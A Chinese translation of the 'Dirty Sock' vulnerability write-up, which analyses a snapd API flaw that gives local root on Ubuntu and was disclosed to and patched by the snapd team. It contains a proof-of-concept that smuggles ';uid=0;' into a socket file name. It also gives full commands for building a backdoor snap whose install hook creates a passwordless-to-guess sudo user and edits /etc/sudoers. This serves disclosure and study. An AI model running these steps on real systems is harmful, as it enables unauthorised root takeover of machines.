> 原文链接: https://www.anquanke.com//post/id/170942 


# Dirty Sock：Ubuntu提权漏洞分析


                                阅读量   
                                **182913**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者shenaniganslabs，文章来源：shenaniganslabs.io
                                <br>原文地址：[https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01f39f6accdee1c96e.png)](https://p4.ssl.qhimg.com/t01f39f6accdee1c96e.png)



## 一、前言

2019年1月，我在默认安装的Ubuntu系统中找到了一个权限提升漏洞。漏洞位于`snapd` API中，这是系统默认安装的一个服务。本地用户可以利用该漏洞获得系统的root访问权限。

我在[dirty_sock](https://github.com/initstring/dirty_sock/)代码仓库中提供了两款利用程序：

1、[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)：使用`create-user` API，根据Ubuntu SSO的相关信息创建本地用户。

2、[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)：侧加载（sideload）包含`install-hook`的一个snap，创建新的本地用户。

这两种利用方式都适用于默认安装的Ubuntu。我主要在18.10系统上做了测试，但老版本系统也受该漏洞影响。

snapd团队对该漏洞的[响应](https://bugs.launchpad.net/snapd/+bug/1813365)非常迅速且非常恰当。与他们直接合作非常愉快，在此感谢他们的辛勤工作及友善态度。作为一名Ubuntu用户，我在这种互动中也感到非常愉快。

snapd通过本地`UNIX_AF` socket（套接字）提供了一个REST API，当连接到该socket时，snapd通过查询连接对应的UID来实现对受限API函数的访问控制。在对解析字符串的for循环中，用户可以通过可控的socket数据来覆盖某个UID变量，这样任何用户就能访问任何API函数。

获得API访问权限后，用户可以通过各种方法获得root权限，比如前面就提到了两种利用技术。



## 二、什么是Snap

为了简化Linux系统上的软件包（package）管理方式，人们提出了各种标准。作为Ubuntu分支的开发商，Canonical提出了“Snap”软件包管理方式。这种方式可以将所有应用依赖项封装到一个二进制文件中，类似于Windows的应用程序。

整个Snap生态中包含一个“[app store](https://snapcraft.io/store)”，开发者可以利用该商店发布并维护随时可用的软件包。

[snapd](https://github.com/snapcore/snapd)这个systemd服务参与管理本地安装的snap，也会与在线商店进行通信。该服务会自动安装在Ubuntu系统中，并且在“root”用户上下文中运行。Snapd现在正在成为Ubuntu操作系统的重要组成部分，并在针对云和IoT的“Snappy Ubuntu Core”精简分支中发挥重要作用。



## 三、漏洞分析

### <a class="reference-link" name="%E6%9C%89%E8%B6%A3%E7%9A%84Linux%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"></a>有趣的Linux系统信息

Ubuntu系统通过某个systemd服务的unit文件来描述snapd服务，文件具体路径为`/lib/systemd/system/snapd.service`，前几行内容如下：

```
[Unit]
Description=Snappy daemon
Requires=snapd.socket
```

根据这一信息，我们可以将线索指向一个systemd socket unit文件，具体路径为`/lib/systemd/system/snapd.socket`。

文中有几行比较有趣，如下所示：

```
[Socket]
ListenStream=/run/snapd.socket
ListenStream=/run/snapd-snap.socket
SocketMode=0666
```

Linux系统使用`AF_UNIX`之类的UNIX socket实现同一个台主机上不同进程之间的通信，而`AF_INET`和`AF_INET6`之类的socket则用于网络连接场景中的进程间通信。

根据前面的unit文件，我们知道系统会创建两个socket文件，将文件权限设置为`0666`模式（所有人可读可写），这样任何进程才能连接到该socket并与之通信。

我们可以通过文件系统来查看这些socket：

```
$ ls -aslh /run/snapd*
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd-snap.socket
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd.socket
```

有趣的是，我们可以使用Linux的`nc`工具（只要符合BSD风格即可）来与这类`AF_UNIX` socket通信。例如，当我们用`nc`连接到这些socket并按下Enter键时，会看到如下信息：

```
$ nc -U /run/snapd.socket

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

更为有趣的是，当攻击者成功入侵某台主机时，首先往往会寻找运行在root上下文环境中的隐藏服务。HTTP服务器是主要的目标，这些服务器通常与网络套接字紧密联系。

从这些信息中我们已经找到了一个较好的利用目标：这是一个隐藏的HTTP服务，很可能没有经过广泛的测试，许多自动化提权工具并不会检查这个服务。

> 备注：我开发的提权工具[uptux](https://github.com/initstring/uptux)能成功识别出这个有趣的目标。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"></a>漏洞代码

由于这是一个开源项目，因此我们可以通过源代码来静态分析。开发者提供了关于这个REST API的详细文档，大家可以参考[此处](https://github.com/snapcore/snapd/wiki/REST-API)了解更多信息。

需要重点关注的一个API函数为：`POST /v2/create-user`，根据文档描述，该函数可以“创建一个本地用户”。文档中提到该调用需要root访问权限才能执行。

那么守护程序（daemon）如何知道访问该API的用户已经具备root权限？

通过源码分析，我们可以找到一个[文件](https://github.com/snapcore/snapd/blob/4533d900f6f02c9a04a59e49e913f04a485ae104/daemon/ucrednet.go)（这里我引用的是存在漏洞的历史版本）。

观察如下一行代码：

```
ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)
```

这里会调用golang的一个标准库来收集与socket连接有关的用户信息。

通常情况下，`AF_UNIX` socket系列中包含一个选项，可以允许发送进程以附加数据（ancillary data）发送凭据信息（参考Linux命令`man unix`）。

这是用来判断访问该API进程权限的一种相当可靠的方式。

利用golang调试器`delve`，我们可以观察执行`nc`命令后所返回信息。在调试器中，我们可以在该函数上设置断点，然后使用delve的`print`命令来显示`ucred`变量的当前值：

```
&gt; github.com/snapcore/snapd/daemon.(*ucrednetListener).Accept()
...
   109:            ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)
=&gt; 110:            if err != nil `{`
...
(dlv) print ucred
*syscall.Ucred `{`Pid: 5388, Uid: 1000, Gid: 1000`}`
```

这看起来非常不错，程序发现我的uid为1000，准备拒绝我访问敏感的API函数。如果这些变量以这种状态被程序所使用，那么的确会出现这种情况，然而事实并非如此。

实际上在该函数中还包含其他一些处理过程，与该连接有关的信息会与前面这些值一起加入到一个新的对象中：

```
func (wc *ucrednetConn) RemoteAddr() net.Addr `{`
    return &amp;ucrednetAddr`{`wc.Conn.RemoteAddr(), wc.pid, wc.uid, wc.socket`}`
`}`
```

然后所有这些值会拼接成一个string变量：

```
func (wa *ucrednetAddr) String() string `{`
    return fmt.Sprintf("pid=%s;uid=%s;socket=%s;%s", wa.pid, wa.uid, wa.socket, wa.Addr)
`}`
```

最终该变量会由该函数负责解析，拼接成的字符串会被再次拆分，分解成独立的字段：

```
func ucrednetGet(remoteAddr string) (pid uint32, uid uint32, socket string, err error) `{`
...
    for _, token := range strings.Split(remoteAddr, ";") `{`
        var v uint64
...
        `}` else if strings.HasPrefix(token, "uid=") `{`
            if v, err = strconv.ParseUint(token[4:], 10, 32); err == nil `{`
                uid = uint32(v)
            `}` else `{`
                break
`}`
```

最后一个函数的功能是将字符串按`;`符号拆分，然后查找开头为`uid=`的信息。由于函数会遍历所有的拆分字段，因此后出现的`uid=`会覆盖先出现的值。

那么如果我们能通过某种方式将任意文本注入该函数中呢？

回到delve调试器，我们可以看一下`remoteAddr`字符串，检查一下`nc`连接中该字段包含哪些数据（`nc`正确实现了HTTP GET请求）：

请求操作：

```
$ nc -U /run/snapd.socket
GET / HTTP/1.1
Host: 127.0.0.1
```

调试输出：

```
github.com/snapcore/snapd/daemon.ucrednetGet()
...
=&gt;  41:        for _, token := range strings.Split(remoteAddr, ";") `{`
...
(dlv) print remoteAddr
"pid=5127;uid=1000;socket=/run/snapd.socket;@"
```

现在，我们并不使用包含`uid`及`pid`之类独立属性的一个对象，而是直接使用已拼接所有字段的一个字符串变量，这个字符串包含4个不同的元素。第二个元素`uid=1000`代表我们当前的控制权限。

如果该函数按照`;`来拆分这个字符串并迭代处理，那么有两部分数据（如果包含`uid=`字符串）可能会覆盖第一个`uid=`字段，但只有在我们能影响这些数据才可以实现该目标。

第一部分（`socket=/run/snapd.socket`）是用来监听socket的本地“网络地址”：服务定义的待绑定（bind）的文件路径。我们没有权限修改snapd，无法让其使用另一个socket名来运行，因此似乎我们不大可能修改该值。

但调试信息中字符串末尾的`@`符号是什么？该符号源自何处？我们可以从`remoteAddr`这个变量名中找到线索。在调试器中探索一番后，我们可以看到golang标准库（`net.go`）会返回本地网络地址**以及**远程地址，我们可以在调试会话中看到这些信息（`laddr`以及`raddr`）：

```
&gt; net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
...
=&gt; 210:    func (c *conn) LocalAddr() Addr `{`
...
(dlv) print c.fd
...
    laddr: net.Addr(*net.UnixAddr) *`{`
        Name: "/run/snapd.socket",
        Net: "unix",`}`,
    raddr: net.Addr(*net.UnixAddr) *`{`Name: "@", Net: "unix"`}`,`}`
```

远程地址会被设置为神秘的`@`符号。进一步阅读`man unix`帮助信息后，我们了解到这与“抽象命名空间（abstract namespace）”有关，用来绑定独立于文件系统的socket。命名空间中的socket开头为`null-byte`（空字节）字符，该字符在终端中通常会显示为`@`。

我们可以创建绑定到我们可控文件名的socket，而不去依赖netcat所使用的抽象套接字命名空间。这样操作应该能影响我们想修改的字符串变量的部分数据，也就是前面显示的`raddr`变量。

通过一些简单的python代码，我们可以创建包含`;uid=0;`字符串的文件名，然后将socket绑定到该文件，最后利用该socket连接到snapd API。

漏洞利用POC代码片段如下：

```
## Setting a socket name with the payload included
sockfile = "/tmp/sock;uid=0;"

## Bind the socket
client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client_sock.bind(sockfile)

## Connect to the snap daemon
client_sock.connect('/run/snapd.socket')
```

现在我们可以在调试器中，再次观察`remoteAddr`变量的值：

```
&gt; github.com/snapcore/snapd/daemon.ucrednetGet()
...
=&gt;  41:        for _, token := range strings.Split(remoteAddr, ";") `{`
...
(dlv) print remoteAddr
"pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"
```

很好，这里我们成功注入了一个假的uid（`uid=0`），也就是root用户，在最后一次迭代处理中该字段会覆盖实际的uid值。这样我们就能够访问受包含的API函数。

我们可以在调试器中继续该函数，验证uid是否会被设置为0。delve的输出结果如下：

```
&gt; github.com/snapcore/snapd/daemon.ucrednetGet()
...
=&gt;  65:        return pid, uid, socket, err
...
(dlv) print uid
0
```



## 四、武器化

### <a class="reference-link" name="%E7%89%88%E6%9C%AC1"></a>版本1

[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)利用的是“POST /v2/create-user”这个API函数。为了利用该漏洞，我们只需在[Ubuntu SSO](https://login.ubuntu.com/)上创建一个账户，然后将SSH公钥上传到账户目录中，接下来使用如下命令来利用漏洞（使用我们注册的邮箱和关联的SSH私钥）：

```
$ dirty_sockv1.py -u you@email.com -k id_rsa
```

这种利用方式非常可靠并且可以安全执行，现在我们已经可以获得root权限。

当然这里我们需要能够访问互联网，目标主机也需要开放SSH服务，那么我们是否可以在更加受限的环境中利用漏洞呢？

### <a class="reference-link" name="%E7%89%88%E6%9C%AC2"></a>版本2

[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)使用了“POST /v2/snaps” API来侧加载一个snap，该snap中包含一个bash脚本，可以添加一个本地用户。这种利用方式适用于没有运行SSH服务的目标系统，也适用于没有互联网连接的较新版Ubuntu。然而，这里的侧加载方式的确需要一些核心snap依赖，如果缺乏这些依赖，可能会触发snapd服务的更新操作。根据我的测试，我发现这种方式仍然有效，但只能使用**一次**。

snap本身运行在沙箱（sandbox）环境中，并且数字签名需要匹配主机已信任的公钥。然而我们可以使用处于开发模式（“devmode”）的snap来降低这些限制条件，这样snap就能像其他应用那样访问操作系统。

此外snap还引入了“hooks”机制，其中“install hook”会在snap安装时运行，并且“install hook”可以是一个简单的shell脚本。如果snap配置为“devmode”，那么这个hook会在root上下文中运行。

我创建了一个简单的snap，该snap没有其他功能，只是会在安装阶段执行的一个bash脚本。该脚本会运行如下命令：

```
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers
```

上面中的加密字符串实际上是`dirty_sock`文本经过Python的`crypt.crypt()`函数处理后的结果。

创建该snap的具体命令如下所示，我们可以在开发主机（而非目标主机）上执行这些命令。snap创建完毕后，我们可以将其转换为base64文本，以便整合到完整的python利用代码中。

```
## Install necessary tools
sudo apt install snapcraft -y

## Make an empty directory to work with
cd /tmp
mkdir dirty_snap
cd dirty_snap

## Initialize the directory as a snap project
snapcraft init

## Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

## Write the script we want to execute as root
cat &gt; snap/hooks/install &lt;&lt; "EOF"
#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers
EOF

## Configure the snap yaml file
cat &gt; snap/snapcraft.yaml &lt;&lt; "EOF"
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

## Build the snap
snapcraft
```

如果大家不放心的话，可以使用如上命令自己创建snap。

生成snap文件后，我们可以使用bash将其转换成base64文本，命令如下：

```
$ base64 &lt;snap-filename.snap&gt;
```

经过base64编码的文本可以存放到`dirty_sock.py`利用代码开头处的`TROJAN_SNAP`全局变量中。

利用程序使用python语言开发，会执行如下操作：

1、创建一个随机文件，文件名中包含`;uid=0;`字符串

2、将一个socket绑定到该文件

3、连接到snapd API

4、删除后门snap（如果上一次执行中断导致snap残留）

5、安装后门snap

6、删除后门snap

7、删除临时socket文件

8、漏洞利用成功

[![](https://p5.ssl.qhimg.com/t01d694fb6320c978ae.png)](https://p5.ssl.qhimg.com/t01d694fb6320c978ae.png)



## 五、防护及缓解措施

请及时给系统打补丁，我披露漏洞后snapd团队第一时间就解决了这个问题。
